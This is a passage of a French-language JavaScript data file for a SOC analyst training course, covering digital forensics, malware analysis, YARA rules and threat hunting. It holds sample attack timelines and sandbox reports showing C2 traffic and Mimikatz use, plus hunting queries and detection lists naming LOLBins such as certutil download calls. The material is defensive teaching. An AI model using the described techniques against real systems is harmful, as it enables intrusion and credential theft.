              "Votre entreprise subit un ransomware, des données clients sont chiffrées. Que faire dans les 72h ?"
            ],
            niveau_recruteur: `Connaître PICERL et pouvoir décrire comment répondre à un incident type = attendu en L1. Avoir participé à un tabletop exercise ou challenge DFIR = très valorisé.`,
            erreurs: ["Éradiquer avant de conserver les preuves (copie forensique du disque d'abord).", "Oublier la notification RGPD dans les 72h si données personnelles impactées.", "Traiter l'IR seul sans communiquer — l'IR est un sport d'équipe."],
            resume: `PICERL : Préparation → Identification → Confinement → Éradication → Récupération → Leçons. Ransomware : isoler, identifier la variante, vérifier les backups, notifier CNIL si données perso. Communication : quoi/qui/quand/impact/actions/besoin.`
          }
        }
      ]
    },

    // ─────────────────────────────────────────────────────────
    // MODULE 6 — INVESTIGATION AVANCÉE
    // ─────────────────────────────────────────────────────────
    {
      id: "m6",
      titre: "Investigation Avancée",
      description: "Forensics, analyse de malwares, threat hunting — passer du niveau L1 au niveau L2.",
      icon: "🔬",
      couleur: "#f59e0b",
      mois: "Mois 9–12",
      ordre: 6,
      objectif: "Conduire une investigation forensique complète. Analyser un malware. Chasser les menaces proactivement.",
      competences: [
        {
          id: "m6c1",
          titre: "Digital Forensics — Investigation endpoint",
          description: "Collecter et analyser des preuves numériques selon les règles de l'art.",
          duree: "2 semaines",
          difficulte: "expert",
          prerequis: ["m2c2","m5c4"],
          sous_competences: [
            "Principes forensiques : intégrité, chain of custody",
            "Artefacts Windows : prefetch, LNK, MFT, Amcache, ShimCache",
            "Artefacts Linux : bash_history, wtmp, /proc",
            "Timeline d'investigation (Plaso/log2timeline)",
            "Outils : Autopsy, FTK Imager, Volatility",
            "Rapport d'investigation forensique"
          ],
          cours: {
            simple: `Le forensic numérique, c'est l'art de reconstituer ce qui s'est passé sur un système après un incident. Comme une scène de crime : collecter les preuves sans les contaminer, les analyser méthodiquement, produire un rapport. En SOC L1, tu fais du forensic léger — mais connaître les bases te rend bien plus efficace.

---

## L'ordre de volatilité — Ce qu'il faut collecter en premier

Les preuves numériques disparaissent — certaines très vite. Règle d'or : collecter du plus volatile au moins volatile.

| Priorité | Source | Durée de vie |
|----------|--------|-------------|
| 1 | Mémoire RAM (processus actifs, connexions, clés chiffrement) | Perdue au redémarrage |
| 2 | Table de routage, connexions réseau actives | Minutes |
| 3 | Processus en cours d'exécution | Variable |
| 4 | Fichiers temporaires, fichiers ouverts | Heures |
| 5 | Registre Windows (état actuel) | Jours |
| 6 | Event Logs | Jours à semaines (rotation) |
| 7 | Disque dur (fichiers, \$MFT, Prefetch) | Permanent |

**Règle SOC :** ne jamais redémarrer un système compromis avant d'avoir capturé la mémoire RAM. Le redémarrage efface les preuves les plus importantes.

---

## Artefacts Windows — Ce que tu analyses

### Prefetch files
**Où :** \`C:\\Windows\\Prefetch\\\`
**Ce que ça contient :** la liste des programmes exécutés récemment, avec le timestamp d'exécution
**Pourquoi c'est utile :** même si l'attaquant a effacé son malware, le Prefetch peut garder une trace de son exécution

\`\`\`
MIMIKATZ.EXE-ABC123.pf → exécuté le 2024-01-15 à 14:32:01
\`\`\`

### \$MFT (Master File Table)
**Ce que c'est :** le "registre" de tous les fichiers sur le disque NTFS — même ceux supprimés
**Outil :** MFTECmd (Eric Zimmerman Tools)
**Pourquoi c'est utile :** retrouver des fichiers supprimés par l'attaquant

### Event Logs (EVTX)
**Où :** \`C:\\Windows\\System32\\winevt\\Logs\\\`
**Fichiers clés :**
- \`Security.evtx\` : authentifications, objets, processus
- \`System.evtx\` : services, drivers
- \`Microsoft-Windows-Sysmon%4Operational.evtx\` : si Sysmon installé
- \`Microsoft-Windows-PowerShell%4Operational.evtx\` : scripts PowerShell exécutés

### Registry Hives
**Fichiers à analyser :**
- \`SYSTEM\` : configuration système, services
- \`SOFTWARE\` : logiciels installés, clés Run
- \`NTUSER.DAT\` : config utilisateur, UserAssist (programs exécutés), RecentDocs

---

## Timeline reconstruction — L'objectif du forensic

**Ce que tu veux produire :** une timeline chronologique de toutes les actions de l'attaquant.

\`\`\`
2024-01-15 14:22:01 → Email phishing reçu (pièce jointe facture.xlsm)
2024-01-15 14:22:45 → Ouverture du fichier par alice.martin (Prefetch Word)
2024-01-15 14:22:51 → Exécution macro VBA → powershell.exe lancé (Sysmon Event 1)
2024-01-15 14:22:53 → Téléchargement payload.exe depuis 185.220.101.42 (proxy log)
2024-01-15 14:22:55 → payload.exe déposé dans C:\\Users\\alice\\AppData\\Roaming\\ (Sysmon Event 11)
2024-01-15 14:23:01 → Clé registre Run créée pour persistance (Sysmon Event 13)
2024-01-15 14:23:15 → Connexion C2 vers 185.220.101.42:4444 (Sysmon Event 3)
2024-01-15 14:32:00 → Exécution Mimikatz (Prefetch MIMIKATZ.EXE, Sysmon Event 1)
\`\`\`

---

## Outils forensic Windows — À connaître

| Outil | Utilité |
|-------|---------|
| **Eric Zimmerman Tools** | Suite complète : MFTECmd, PECmd (Prefetch), RECmd (Registry) |
| **Volatility** | Analyse de dump mémoire |
| **Autopsy** | Interface graphique pour analyse disque |
| **FTK Imager** | Capture d'image disque et RAM |
| **Log Parser** | Analyse des Event Logs EVTX |
| **Wireshark** | Analyse PCAP réseau |

**Règle forensic :** toujours travailler sur une COPIE des preuves, jamais sur l'original. L'image disque est sacrée.`,
            technique: `## Artefacts Windows — Ce qui prouve l'exécution

\`\`\`
Prefetch (.pf) → C:\\Windows\\Prefetch\\
  Preuve qu'un programme a été exécuté (même si supprimé)
  Contient : nom, timestamp, nombre d'exécutions, fichiers chargés

Amcache.hve → C:\\Windows\\AppCompat\\Programs\\
  SHA1 de TOUS les exécutables qui ont tourné
  Persiste même après désinstallation

ShimCache (AppCompatCache) → HKLM\\SYSTEM\\...CompatibilityAssistant\\Store
  Liste de tous les exécutables vus par le système

LNK files → C:\\Users\\[user]\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\
  Raccourcis créés automatiquement : prouve l'ouverture d'un fichier

MFT ($MFT) → Master File Table NTFS
  Métadonnées de tous les fichiers (même supprimés)
  Timestamps : Created, Modified, MFT Changed, Accessed (MACB)
\`\`\`

## Collecte forensique — Ordre de volatilité
\`\`\`
1. Mémoire vive (RAM) → la plus volatile
2. Cache CPU / registres
3. Connexions réseau actives
4. Processus en cours
5. Fichiers ouverts
6. Contenu des disques
7. Logs système
8. Données archivées
\`\`\`

## FTK Imager — Créer une image disque
\`\`\`
1. FTK Imager → File → Create Disk Image
2. Source : Physical Drive
3. Destination : format E01 (avec hash MD5/SHA1 intégré)
4. Vérifier le hash après création = intégrité garantie
5. Travailler UNIQUEMENT sur la copie, jamais l'original
\`\`\``,
            attaquant: `Les attaquants tentent d'effacer leurs traces : vider les logs (Event 1102 = audit log cleared), supprimer les fichiers, utiliser des outils en mémoire uniquement (fileless malware). Contre-mesures forensiques : logs centralisés (SIEM), copie en mémoire, timestamps MFT non modifiables.`,
            soc: `## Artefacts clés par question forensique

\`\`\`
Question : "Ce programme a-t-il été exécuté ?"
→ Prefetch + Amcache + ShimCache + Event 4688

Question : "Quand le fichier malveillant est-il arrivé ?"
→ MFT timestamps (Created) + $USN Journal + Zone.Identifier (téléchargé d'Internet)

Question : "L'attaquant a-t-il accédé aux données ?"
→ LNK files + MRU (Most Recently Used) registre + USN Journal

Question : "Comment a-t-il persisté ?"
→ Registre Run keys + Scheduled Tasks + Services + WMI subscriptions

Question : "Quand a-t-il eu accès ?"
→ Event 4624 + Windows logon artifacts + browser history
\`\`\``,
            logs_exemples: `## Autopsy — Artefact Prefetch
\`\`\`
File: MIMIKATZ.EXE-[hash].pf
Last Run: 2024-01-15 03:22:47
Run Count: 3
Files Referenced:
  - C:\\Windows\\System32\\lsass.exe
  - C:\\Windows\\Temp\\mimikatz.exe
\`\`\`
Preuve forensique : Mimikatz a été exécuté 3 fois, la dernière à 03h22. Il a accédé à lsass.exe.`,
            atelier: {
              titre: "Atelier : Investigation forensique sur un challenge DFIR",
              duree: "4h",
              niveau: "expert",
              objectif: "Analyser une image disque fournie et répondre aux questions d'investigation",
              contexte: "CyberDefenders : challenge 'The Planet's Prestige' ou 'Insider'. Image disque Windows fournie.",
              outils: ["Autopsy (gratuit)", "FTK Imager", "CyberDefenders.org"],
              etapes: [
                "Télécharger l'image disque depuis CyberDefenders",
                "Ouvrir dans Autopsy : File → New Case → Add Data Source",
                "Analyser les artefacts : Installed Programs, Web Activity, Recent Documents",
                "Prefetch : quels programmes suspects ont été exécutés ?",
                "Browser History : quels sites ont été visités ?",
                "Timeline : reconstruire la séquence des événements",
                "Répondre aux questions du challenge"
              ],
              livrable: "Rapport d'investigation : timeline complète, artefacts clés, réponses aux questions du challenge."
            },
            cas_concret: `## Prouver l'exécution d'un malware supprimé

L'attaquant a supprimé le fichier malveillant. Peut-on prouver son exécution ?

\`\`\`
Autopsy → Prefetch : PAYLOAD.EXE-[hash].pf
  → Prouve l'exécution (timestamp, nombre de fois)
  
Amcache.hve : SHA1 de payload.exe retrouvé
  → VirusTotal sur ce SHA1 → "Emotet dropper"
  
ShimCache : payload.exe dans la liste
  → Confirm qu'il a tourné

$USN Journal : entrée de création et suppression de payload.exe
  → Timeline de la présence du fichier
\`\`\`

Même sans le fichier, on prouve forensiquement son exécution, sa nature malveillante, et l'horodatage.`,
            exercices: [
              { titre: "5 challenges forensics CyberDefenders", desc: "Résoudre 5 challenges forensics sur CyberDefenders (niveaux easy et medium). Documenter les artefacts trouvés et la méthodologie.", difficulte: "expert", type: "lab", outil: "CyberDefenders, Autopsy, Volatility" }
            ],
            questions: [
              "Qu'est-ce que la chain of custody et pourquoi est-elle critique dans un contexte légal ?",
              "Un attaquant a supprimé tous les logs Windows (Event 1102 détecté). Quelles preuves forensiques restent ?",
              "Quelle est la différence entre les timestamps MFT et les timestamps du système de fichiers ?"
            ],
            niveau_recruteur: `Forensics = compétence L2/L3 mais très valorisée si mentionnée avec des projets concrets. CyberDefenders challenges = preuve pratique. Les certifications GCFE/GCFA valident ce niveau.`,
            erreurs: ["Travailler sur l'original au lieu d'une copie forensique.", "Oublier de hasher l'image avant et après — intégrité non prouvable.", "Ignorer les artefacts de second niveau (Amcache, ShimCache) et se concentrer uniquement sur les logs."],
            resume: `Ordre de volatilité : RAM → réseau → processus → disque. Artefacts clés : Prefetch (exécution), Amcache (hash), MFT (timestamps), LNK (accès fichiers). Toujours travailler sur une copie hashée.`
          }
        },
        {
          id: "m6c2",
          titre: "Malware Analysis — Analyse statique et dynamique",
          description: "Analyser un fichier malveillant pour extraire ses IOC et comprendre son comportement.",
          duree: "2 semaines",
          difficulte: "expert",
          prerequis: ["m6c1"],
          sous_competences: [
            "Analyse statique basique : strings, file, PE headers",
            "pestudio et FLOSS — extraction d'artifacts",
            "Sandbox dynamique : Any.run, Hybrid Analysis",
            "Extraction d'IOC",
            "YARA rules — écrire une règle basique",
            "Rapport d'analyse malware"
          ],
          cours: {
            simple: `Analyser un malware = comprendre ce qu'il fait sans se faire infecter. L'objectif en SOC L1 : extraire les IoCs (IPs, domaines, hashes) et identifier la famille de malware pour enrichir les défenses. Il existe deux approches : statique (sans exécuter) et dynamique (exécution en sandbox).

---

## Analyse statique — Sans exécuter

**Ce que c'est :** analyser le fichier en lui-même sans le lancer. Rapide, sûr.

### Étape 1 — Hash et vérification VirusTotal
\`\`\`bash
# Calculer le hash SHA256
sha256sum fichier_suspect.exe
# → d41d8cd98f00b204e9800998ecf8427e

# Soumettre sur VirusTotal → détecté par combien d'AV ?
\`\`\`

**Ce que tu cherches :** si 30+ antivirus le détectent → malware connu. Si 0 → nouveau ou obfusqué.

### Étape 2 — Strings (chaînes de caractères)
\`\`\`bash
strings fichier.exe | grep -i "http\\|.exe\\|cmd\\|powershell\\|password\\|decrypt"
\`\`\`

**Ce que tu peux trouver :** URLs de C2, noms de fichiers créés, messages de rançon, clés de registre.

### Étape 3 — Analyse PE (format Portable Executable Windows)
**Outils :** PE-bear, DIE (Detect It Easy), ExeinfoPE

**Ce que tu cherches :**
- **Imports/DLLs** : quelles fonctions Windows le malware utilise ?
  - \`InternetOpen\`, \`URLDownloadToFile\` → téléchargement
  - \`CreateRemoteThread\` → injection de processus
  - \`RegSetValueEx\` → modification du registre (persistance)
- **Sections du PE** : entropie haute → code probablement chiffré/packé

---

## Analyse dynamique — En sandbox

**Ce que c'est :** exécuter le malware dans un environnement isolé et observer son comportement.

### Sandboxes en ligne (rapide, sans risque)
- **Any.run** (any.run) : sandbox interactive en temps réel, très visual
- **Hybrid Analysis** (hybrid-analysis.com) : rapport détaillé automatique
- **Joe Sandbox** : rapport technique complet

**Ce que le rapport de sandbox te donne :**
- Processus créés
- Fichiers créés/modifiés/supprimés
- Connexions réseau (IPs, domaines, ports contactés)
- Modifications registre
- APIs Windows utilisées

**Exemple de rapport Any.run :**
\`\`\`
Processes created:
  powershell.exe → net.exe, whoami.exe, cmd.exe

Network connections:
  185.220.101.42:4444 TCP (Metasploit C2)
  evil-domain.xyz:80 HTTP GET /beacon

Files created:
  C:\\Users\\user\\AppData\\Roaming\\svchost.exe (malware copy)

Registry:
  HKCU\\...\\Run\\svchost = C:\\Users\\user\\AppData\\Roaming\\svchost.exe
\`\`\`

---

## Familles de malware à connaître en SOC

| Famille | Type | Comportement caractéristique |
|---------|------|------------------------------|
| **Emotet** | Loader/Banker | Email phishing Word, télécharge d'autres malwares |
| **QakBot** | Banker/Loader | Vole credentials bancaires, déploie ransomware |
| **Cobalt Strike** | Framework C2 | Beacon HTTP/HTTPS régulier, post-exploitation |
| **Mimikatz** | Credential stealer | Dump LSASS, vol de hashes/tickets |
| **LockBit/Ryuk** | Ransomware | Chiffrement massif, note de rançon |
| **njRAT/AsyncRAT** | RAT | Accès complet à distance, keylogger |

---

## IoCs à extraire après analyse

**Ce que tu dois documenter et intégrer dans le SIEM/firewall :**
1. **Hash SHA256** du fichier malveillant
2. **IPs de C2** (pour blocage firewall + rule SIEM)
3. **Domaines de C2** (pour blocage DNS/proxy)
4. **Noms de fichiers** créés par le malware (pour chasse dans EDR)
5. **Clés de registre** (pour chasse dans les autres endpoints)

**Règle :** un IOC extrait et partagé protège tous les autres postes de l'entreprise. C'est ça, la valeur du malware analysis pour le SOC.`,
            technique: `## Analyse statique — Outils

\`\`\`bash
# Identifier le type de fichier (ne pas faire confiance à l'extension)
file malware.exe
# Output: PE32 executable (GUI) Intel 80386

# Extraire les chaînes lisibles (IOC potentiels)
strings -n 8 malware.exe | grep -E "(http|https|cmd|powershell|registry)"

# FLOSS — extraire les strings obfusquées (stacked strings, XOR)
floss malware.exe

# pestudio
# → PE headers (timestamp de compilation)
# → Imports (quelles DLL/fonctions utilisées)
# → Strings suspectes
# → Indicateurs (blacklisted APIs, imports suspects)
\`\`\`

## API Windows suspectes dans les imports
\`\`\`
CreateRemoteThread   → injection de code dans un autre process
VirtualAllocEx       → allocation mémoire dans un autre process
WriteProcessMemory   → écriture dans la mémoire d'un autre process
SetWindowsHookEx     → keylogger
URLDownloadToFile    → téléchargement depuis Internet
ShellExecute         → lancement de processus
RegSetValueEx        → modification du registre (persistence)
\`\`\`

## YARA — Règle basique
\`\`\`yara
rule Emotet_Dropper {
    meta:
        author = "SOC Analyst"
        date = "2024-01-15"
        description = "Détecte un dropper Emotet basé sur ses strings"
    
    strings:
        $s1 = "cmd.exe /c powershell" nocase
        $s2 = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $s3 = { 4D 5A 90 00 }  // MZ header (PE file)
        $url = /https?:\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\/[a-z]{4,8}\.(php|aspx)/
    
    condition:
        uint16(0) == 0x5A4D  // MZ magic bytes
        and 2 of ($s1, $s2, $url)
}
\`\`\``,
            attaquant: `Les malwares modernes obfusquent leurs strings (XOR, base64, stacked strings), packent le binaire (UPX, custom packer), et utilisent des techniques anti-sandbox (vérifier si VM, détecter les outils d'analyse, délai d'exécution).`,
            soc: `## Workflow analyse malware SOC

\`\`\`
1. NE PAS exécuter sur le poste de travail
2. Hash SHA256 → VirusTotal (déjà connu ?)
3. Si inconnu/0 détection : analyse statique (strings, pestudio)
4. Sandbox : Any.run ou Hybrid Analysis
5. Extraire les IOC : IPs C2, domaines, hashes, clés de registre
6. Identifier la famille (VirusTotal + sandbox report)
7. Créer une règle YARA pour détecter les variantes
8. Ajouter les IOC dans le SIEM
\`\`\``,
            logs_exemples: `## Rapport Any.run — Analyse sandbox
\`\`\`
File: invoice_2024.doc
MD5: abc123...
SHA256: def456...
Verdict: MALICIOUS

Behavior:
  Process tree:
    WINWORD.EXE → cmd.exe → regsvr32.exe → (injected) svchost.exe

Network activity:
  DNS: evil-domain.xyz → 185.x.x.x
  HTTP POST: http://185.x.x.x/gate.php (data: encrypted)

File system:
  Created: C:\\Users\\user\\AppData\\Roaming\\update.exe
  
Registry:
  HKCU\\Run\\WindowsUpdate = C:\\Users\\user\\AppData\\Roaming\\update.exe

Signatures matched:
  - Emotet C2 communication
  - Persistence via Run key
  - T1218.010 (Regsvr32 abuse)
\`\`\``,
            atelier: {
              titre: "Atelier : Analyser un malware réel depuis MalwareBazaar",
              duree: "2h",
              niveau: "expert",
              objectif: "Analyse complète statique + dynamique d'un sample et extraction des IOC",
              contexte: "Tu reçois un hash suspect d'un endpoint isolé. Tu dois analyser le fichier pour produire le rapport d'incident.",
              outils: ["MalwareBazaar (télécharger sample)", "pestudio", "FLOSS", "Any.run (sandbox gratuite)", "VirusTotal"],
              etapes: [
                "Télécharger un sample sur MalwareBazaar (famille connue, tagged 'emotet' ou 'qbot')",
                "SHA256 → VirusTotal : combien de détections ? Famille identifiée ?",
                "file + strings : type de fichier, strings suspectes",
                "pestudio : PE headers, imports suspects, compilation timestamp",
                "Any.run : soumettre le sample, observer l'exécution",
                "Extraire du rapport sandbox : IPs C2, domaines, hashes, persistence",
                "Écrire une règle YARA basée sur les strings trouvées"
              ],
              livrable: "Rapport d'analyse : famille malware, IOC complets, TTPs MITRE, règle YARA, recommandations."
            },
            cas_concret: `## Analyse Emotet — Rapport complet

**Analyse statique :**
- strings : URLs de C2, commandes cmd/PowerShell, clé de registre Run
- pestudio : imports suspects : URLDownloadToFile, CreateRemoteThread, RegSetValueEx

**Analyse dynamique (Any.run) :**
- WINWORD.EXE → cmd.exe → regsvr32.exe (T1218.010)
- Connexion HTTPS vers 185.x.x.x, 45.y.y.y, 91.z.z.z (infrastructure Emotet)
- Persistence : HKCU\\Run\\UpdateService

**IOC extraits :**
IPs C2 : 185.x.x.x, 45.y.y.y, 91.z.z.z
Hash : sha256:abc123... → Emotet dropper confirmed
Registry : HKCU\\Run\\UpdateService

**Règle YARA :**
Détecte les variantes avec les mêmes strings de C2 et la technique regsvr32.`,
            exercices: [
              { titre: "Analyser 3 malwares depuis MalwareBazaar", desc: "3 samples de familles différentes (ex: Emotet, AgentTesla, njRAT). Pour chaque : rapport complet statique + dynamique + IOC + règle YARA.", difficulte: "expert", type: "lab", outil: "MalwareBazaar, pestudio, Any.run" }
            ],
            questions: [
              "Quelle est la différence entre analyse statique et dynamique ? Avantages et inconvénients de chacune ?",
              "CreateRemoteThread dans les imports d'un PE — que suspectez-vous ?",
              "Comment écrire une règle YARA qui résiste aux variantes du même malware ?"
            ],
            niveau_recruteur: `L'analyse malware est une compétence L2/L3 mais les bases (sandbox, strings, IOC extraction) sont valorisées en L1. Des projets d'analyse documentés sur GitHub = différenciateur fort.`,
            erreurs: ["Exécuter un malware en dehors d'une sandbox isolée.", "Faire confiance uniquement à VirusTotal (0/72 ne signifie pas sain).", "Ignorer les imports de DLL — c'est là que se trouve la logique du malware."],
            resume: `Statique : strings + pestudio + imports. Dynamique : Any.run/Hybrid Analysis. IOC : IPs C2 + domaines + hashes + persistence. YARA = règle de détection portables. Toujours en sandbox isolée.`
          }
        },
        {
          id: "m6c3",
          titre: "Threat Hunting — Chasse proactive aux menaces",
          description: "Chasser les menaces qui ont échappé aux alertes automatiques.",
          duree: "2 semaines",
          difficulte: "expert",
          prerequis: ["m5c1","m5c3","m6c1"],
          sous_competences: [
            "Hypothèse-driven hunting vs data-driven hunting",
            "Hunting avec MITRE ATT&CK",
            "Requêtes Splunk/ELK avancées pour le hunting",
            "Anomalie comportementale (UEBA basique)",
            "Hunting sur les artefacts Windows",
            "Documenter un hunt : hypothèse, requêtes, findings"
          ],
          cours: {
            simple: `Le threat hunting, c'est chercher proactivement des attaquants qui ont déjà contourné tes défenses. L'antivirus n'a rien vu, le SIEM n'a pas déclenché d'alerte — mais tu as une hypothèse et tu pars la valider dans les données. C'est le niveau au-dessus du triage réactif.

---

## La différence entre triage et hunting

| Triage réactif (SOC L1) | Threat Hunting (SOC L2/L3) |
|------------------------|--------------------------|
| Une alerte arrive → tu investigues | Pas d'alerte → tu pars chercher |
| Outil pilote : SIEM/EDR | Outil pilote : SIEM/EDR/logs bruts |
| Durée : minutes à heures | Durée : heures à jours |
| Résultat : VP/FP | Résultat : découverte ou absence de menace |

---

## Le processus de threat hunting — Hypothèse → Données → Conclusion

### Étape 1 — Formuler une hypothèse
Une bonne hypothèse vient de :
- **La Threat Intelligence** : "Le groupe APT28 cible les organismes gouvernementaux français cette semaine avec du spearphishing Office"
- **Un incident récent** : "On a eu un Emotet le mois dernier — est-ce qu'il a lateralisé avant qu'on le détecte ?"
- **MITRE ATT&CK** : "Est-ce qu'on voit des signes de T1053 (Scheduled Tasks) inhabituels ?"

### Étape 2 — Identifier les sources de données
| Hypothèse | Sources à interroger |
|-----------|---------------------|
| Mouvement latéral SMB | Firewall interne, Event 4624 LogonType 3 |
| Exfiltration DNS | DNS logs, fréquence des requêtes |
| Persistence via tâches planifiées | Event 4698, Sysmon Event 1 |
| C2 HTTP beaconing | Proxy logs, regularité des connexions |

### Étape 3 — Requêtes de chasse

**Exemple — Chasse aux beacons C2 (connexions régulières) dans Splunk :**
\`\`\`spl
index=proxy
| bin _time span=1h
| stats count by dest_host, _time
| eventstats stdev(count) as std, avg(count) as avg by dest_host
| where std < 2 AND count > 10
| sort -count
\`\`\`
→ Trouve les destinations contactées très régulièrement (faible variance = beacon automatique).

**Exemple — Chasse à PowerShell encodé en KQL (Sentinel) :**
\`\`\`kql
SecurityEvent
| where EventID == 4688
| where CommandLine contains "-EncodedCommand" or CommandLine contains "-enc "
| where ParentProcessName contains "winword" or ParentProcessName contains "excel"
| project TimeGenerated, Computer, Account, ParentProcessName, CommandLine
\`\`\`

**Exemple — Chasse aux tâches planifiées suspectes :**
\`\`\`spl
index=windows EventCode=4698
| rex field=TaskContent "(?P<exec><Exec>.*?</Exec>)"
| search exec="*\\\\Temp\\\\*" OR exec="*\\\\AppData\\\\*" OR exec="*\\\\Users\\\\Public\\\\*"
| table TimeCreated, TaskName, SubjectUserName, exec
\`\`\`

---

## Techniques de hunting courants en SOC France 2024

### 1. Beaconing régulier vers Internet
**Hypothèse :** un malware contacte son C2 à intervalles réguliers.
**Signal :** un processus fait des requêtes HTTP vers le même domaine toutes les 60s exactement.

### 2. Lateral Movement par Pass-the-Hash
**Hypothèse :** un attaquant se déplace de poste en poste avec des hashes volés.
**Signal :** Event 4624 LogonType 3 depuis un poste utilisateur vers de nombreux autres postes en peu de temps.

### 3. Living-off-the-Land (LOLBins)
**Hypothèse :** l'attaquant utilise des outils Windows légitimes pour éviter la détection.
**Signal :** \`certutil.exe -urlcache -split\` (téléchargement via certutil), \`mshta.exe\` (exécution HTA), \`regsvr32.exe\` (exécution DLL).

\`\`\`kql
SecurityEvent
| where EventID == 4688
| where NewProcessName has_any ("certutil.exe", "mshta.exe", "regsvr32.exe", "wmic.exe")
| where CommandLine contains "http" or CommandLine contains "\\\\\\\\UNC"
\`\`\`

---

## Le livrable du threat hunt

Après une chasse, tu produis un rapport :
\`\`\`
THREAT HUNT REPORT — 2024-01-15
Hypothèse : Recherche de beaconing C2 non détecté

Périmètre : logs proxy 30 derniers jours, 450 endpoints
Durée : 4 heures

Résultats :
- 2 endpoints avec connexions régulières (toutes les 55-65 sec) vers update-cdn.xyz
- Domaine créé il y a 8 jours (très récent)
- VirusTotal : 0 détection (malware récent/inconnu)
- Confirmé sur EDR : process svchost_.exe (faux svchost) → compromission

Verdict : MENACE TROUVÉE — 2 machines compromises avec C2 non détecté
Actions : isolement, forensic, IoCs partagés, règle SIEM créée
\`\`\`

**Règle du hunting :** même un hunt qui ne trouve rien a de la valeur — ça prouve que la menace suspectée n'est pas présente, ou améliore la couverture de détection.`,
            technique: `## Process de Threat Hunting

\`\`\`
1. HYPOTHÈSE
   "Un attaquant utilise Kerberoasting pour voler des credentials"
   Basée sur : MITRE ATT&CK T1558.003, threat intel récente sur notre secteur
   
2. SOURCES DE DONNÉES
   → Event Log 4769 (DC Windows)
   → Sysmon Event 1 (processus)
   
3. REQUÊTE
   index=windows EventCode=4769
   | where TicketEncryptionType="0x17"  ← RC4
   | stats count by src_ip, ServiceName, SubjectUserName
   | where count > 3
   
4. ANALYSE
   → Trouver des patterns anormaux
   → Comparer avec la baseline
   
5. FINDING
   → Rien trouvé : hunt négatif (améliore la confiance dans la détection)
   → Quelque chose trouvé : ouvrir un incident, investigation forensique
   
6. AMÉLIORATION
   → Créer une règle SIEM automatique basée sur le hunt
   → Documenter le hunt pour les audits
\`\`\``,
            attaquant: `Les attaquants les plus dangereux vivent dans l'environnement sans déclencher d'alertes pendant des semaines (dwell time moyen mondial : 24 jours). Le threat hunting cherche à réduire ce dwell time.`,
            soc: `## Hunts courants — Requêtes Splunk

\`\`\`splunk
# Hunt 1 : PowerShell encodé (T1059.001)
index=sysmon EventCode=1
| where like(CommandLine, "%-enc %") OR like(CommandLine, "%-EncodedCommand %")
| where NOT like(ParentImage, "%sccm%") AND NOT like(ParentImage, "%nessus%")
| stats count by Computer, User, CommandLine
| sort -count

# Hunt 2 : Exécution depuis répertoire suspect (T1059)
index=sysmon EventCode=1
| where like(Image, "%\\\\Temp\\\\%") OR like(Image, "%\\\\AppData\\\\%") OR like(Image, "%\\\\Downloads\\\\%")
| where like(Image, "%.exe")
| stats count by Computer, User, Image, CommandLine
| sort _time desc

# Hunt 3 : Connexions réseau vers ports non standards
index=sysmon EventCode=3
| where NOT (DestinationPort IN (80, 443, 53, 22, 25, 465, 993))
| where NOT like(Image, "%System32%")
| stats count by Image, DestinationIp, DestinationPort
| sort -count
\`\`\``,
            logs_exemples: `## Hunt trouvé : Exécution depuis %TEMP%
\`\`\`
Hunt : "Exécutables dans les répertoires temporaires"
Résultat : 3 occurrences sur 2 machines différentes

WKS-042 | C:\\Users\\john\\AppData\\Local\\Temp\\svchost32.exe
         Parent: explorer.exe | CommandLine: svchost32.exe -c 185.x.x.x 443

WKS-088 | C:\\Users\\marie\\AppData\\Local\\Temp\\update.exe
         Parent: OUTLOOK.EXE | CommandLine: update.exe

Finding : deux endpoints avec des exécutables dans %TEMP%, noms légitimes-looking, connexion réseau.
→ Ouvrir incident, isolation des deux endpoints, analyse forensique.
\`\`\``,
            atelier: {
              titre: "Atelier : Hunt complet sur le dataset BOTS",
              duree: "3h",
              niveau: "expert",
              objectif: "Conduire 3 hunts sur le dataset BOTS de Splunk et documenter les résultats",
              contexte: "Tu soupçonnes qu'un attaquant est présent dans l'infrastructure depuis plusieurs jours. Lance 3 hunts basés sur MITRE ATT&CK.",
              outils: ["Splunk + Dataset BOTS", "MITRE ATT&CK Navigator"],
              etapes: [
                "Hunt 1 : T1059.001 - PowerShell encodé → requête SPL, analyse des résultats",
                "Hunt 2 : T1071.001 - Beaconing HTTP → même IP distante, intervalles réguliers",
                "Hunt 3 : T1003.001 - Accès à lsass → Sysmon Event 10",
                "Pour chaque hunt : documenter hypothèse, requête, résultat",
                "Si finding : ouvrir un incident et investiguer"
              ],
              livrable: "3 fiches de hunt documentées : hypothèse, requête, résultat, action prise."
            },
            cas_concret: `## Hunt proactif qui découvre un APT

Hypothèse : "Des attaquants utilisent DNS tunneling pour exfiltrer des données"

Requête Splunk sur 30 jours :
\`\`\`splunk
index=dns
| stats count, dc(query) as unique_queries, avg(len(query)) as avg_query_len
  by src_ip
| where count > 5000 AND avg_query_len > 35
| sort -count
\`\`\`

Résultat : un serveur de développement génère 50 000 requêtes DNS/jour depuis 3 semaines avec des sous-domaines de 45 caractères en moyenne.

Investigation : DNS tunneling confirmé. Le serveur avait été compromis via une vulnérabilité dans une application web. L'attaquant exfiltrait des données depuis 21 jours. Aucune alerte SIEM ne s'était déclenchée.

Impact : données exfiltrées identifiées, notification RGPD, patch, IOC ajoutés au SIEM.`,
            exercices: [
              { titre: "5 hunts documentés sur BOTS ou CyberDefenders", desc: "Conduire 5 hunts avec hypothèses MITRE ATT&CK différentes. Pour chaque : fiche documentée avec la requête, les résultats, et la règle SIEM créée si finding.", difficulte: "expert", type: "lab", outil: "Splunk BOTS, CyberDefenders" }
            ],
            questions: [
              "Quelle est la différence entre une règle SIEM réactive et un hunt proactif ?",
              "Comment choisir son hypothèse de hunt ? Quelles sources d'information utiliser ?",
              "Un hunt négatif (rien trouvé) est-il utile ? Pourquoi ?"
            ],
            niveau_recruteur: `Le threat hunting est une compétence L2/L3 mais avoir conduit des hunts documentés = différenciateur majeur en entretien. Montre une mentalité proactive et une maîtrise du SIEM.`,
            erreurs: ["Confondre un hunt avec une règle SIEM — le hunt est hypothèse-driven, non automatisé.", "Ne pas documenter les hunts négatifs — ils prouvent la couverture de détection.", "Chasser sans hypothèse → noyé dans les données sans direction."],
            resume: `Hunt = hypothèse MITRE ATT&CK → requête SIEM → analyse → finding ou no-finding → règle SIEM. Réduire le dwell time. Documenter tous les hunts, y compris les négatifs. Différenciateur fort en entretien.`
          }
        }
      ]
    }
  ],

  // ─────────────────────────────────────────────────────────
  // LABS
  // ─────────────────────────────────────────────────────────
  labs: [
